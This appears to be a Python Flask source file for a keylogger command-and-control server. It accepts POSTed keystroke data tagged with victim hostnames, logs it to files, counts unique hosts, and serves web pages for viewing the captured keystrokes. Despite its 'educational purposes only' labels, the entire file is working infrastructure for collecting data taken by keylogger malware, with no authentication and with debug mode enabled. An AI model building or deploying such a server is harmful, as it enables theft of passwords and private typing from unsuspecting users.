"""
API Server to receive keystroke data
FOR EDUCATIONAL PURPOSES ONLY - LOCAL TESTING ONLY
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
from datetime import datetime
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)  

DATA_FILE = "received_keystrokes.json"
HUMAN_READABLE_FILE = "keystrokes_log.txt"

@app.route('/api/keystrokes', methods=['POST'])
def receive_keystrokes():
    """
    Endpoint to receive keystroke data from keylogger
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "No data provided"}), 400
        
        data['received_at'] = datetime.now().isoformat()
        
        logger.info(f"Received keystrokes from {data.get('hostname', 'unknown')}")
        logger.info(f"Keystroke data: {data.get('keystrokes', '')[:50]}...")
        
        save_to_json(data)
        
        save_to_readable(data)
        
        return jsonify({
            "status": "success",
            "message": "Keystrokes received",
            "timestamp": data['received_at']
        }), 200
        
    except Exception as e:
        logger.error(f"Error processing request: {e}")
        return jsonify({"error": str(e)}), 500

def save_to_json(data):
    """
    Save data to JSON file
    """
    try:
        existing = []
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                existing = json.load(f)
        
        existing.append(data)
        
        with open(DATA_FILE, 'w') as f:
            json.dump(existing, f, indent=2)
            
    except Exception as e:
        logger.error(f"Error saving to JSON: {e}")

def save_to_readable(data):
    """
    Save data to human-readable text file
    """
    try:
        with open(HUMAN_READABLE_FILE, 'a', encoding='utf-8') as f:
            f.write("\n" + "="*60 + "\n")
            f.write(f"TIMESTAMP: {data.get('timestamp', 'N/A')}\n")
            f.write(f"RECEIVED: {data.get('received_at', 'N/A')}\n")
            f.write(f"HOSTNAME: {data.get('hostname', 'N/A')}\n")
            f.write("-"*40 + "\n")
            f.write("KEYSTROKES:\n")
            f.write(data.get('keystrokes', ''))
            f.write("\n" + "="*60 + "\n")
            
    except Exception as e:
        logger.error(f"Error saving to readable file: {e}")

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """
    Get statistics about received data
    """
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
            
            stats = {
                "total_entries": len(data),
                "total_keystrokes": sum(len(entry.get('keystrokes', '')) for entry in data),
                "unique_hosts": len(set(entry.get('hostname', '') for entry in data)),
                "last_entry": data[-1] if data else None
            }
            return jsonify(stats)
        else:
            return jsonify({
                "total_entries": 0,
                "message": "No data yet"
            })
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/clear', methods=['POST'])
def clear_data():
    """
    Clear all stored data (for testing)
    """
    try:
        if os.path.exists(DATA_FILE):
            os.remove(DATA_FILE)
        if os.path.exists(HUMAN_READABLE_FILE):
            os.remove(HUMAN_READABLE_FILE)
        return jsonify({"message": "Data cleared"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    """Home page"""
    return """
    <html>
    <head>
        <title>Keylogger API Server</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #f0f0f0; }
            .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 10px; }
            h1 { color: #333; }
            .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 15px; border-radius: 5px; }
            .endpoint { background: #e9ecef; margin: 10px 0; padding: 10px; border-radius: 5px; }
            code { background: #f8f9fa; padding: 2px 5px; border-radius: 3px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Keylogger API Server</h1>
            <div class="warning">
                <strong>⚠️ FOR EDUCATIONAL PURPOSES ONLY</strong><br>
                This server is designed for local testing only.
            </div>
            
            <h2>Available Endpoints:</h2>
            
            <div class="endpoint">
                <strong>POST /api/keystrokes</strong><br>
                <code>Receive keystroke data from keylogger</code>
            </div>
            
            <div class="endpoint">
                <strong>GET /api/stats</strong><br>
                <code>View statistics about received data</code>
            </div>
            
            <div class="endpoint">
                <strong>POST /api/clear</strong><br>
                <code>Clear all stored data</code>
            </div>
            
            <div class="endpoint">
                <strong>GET /view/data</strong><br>
                <code><a href="/view/data">View captured keystrokes</a></code>
            </div>
            
            <div class="endpoint">
                <strong>GET /view/raw</strong><br>
                <code><a href="/view/raw">View raw JSON data</a></code>
            </div>
        </div>
    </body>
    </html>
    """

@app.route('/view/data')
def view_data():
    try:
        if os.path.exists(HUMAN_READABLE_FILE):
            with open(HUMAN_READABLE_FILE, 'r') as f:
                content = f.read()
            return f"<pre>{content}</pre>"
        return "No data captured yet"
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/raw')
def view_raw():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                content = json.load(f)
            return jsonify(content)
        return jsonify([])
    except Exception as e:
        return jsonify({"error": str(e)})

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🔐 KEYLOGGER API SERVER")
    print("="*60)
    print(f"📍 Server running at: http://localhost:5000")
    print(f"📤 POST endpoint: http://localhost:5000/api/keystrokes")
    print(f"📊 Stats: http://localhost:5000/api/stats")
    print(f"👀 View data: http://localhost:5000/view/data")
    print("\n⚠️  FOR EDUCATIONAL USE ONLY - LOCAL TESTING")
    print("="*60 + "\n")
    
    app.run(debug=True, port=5000)
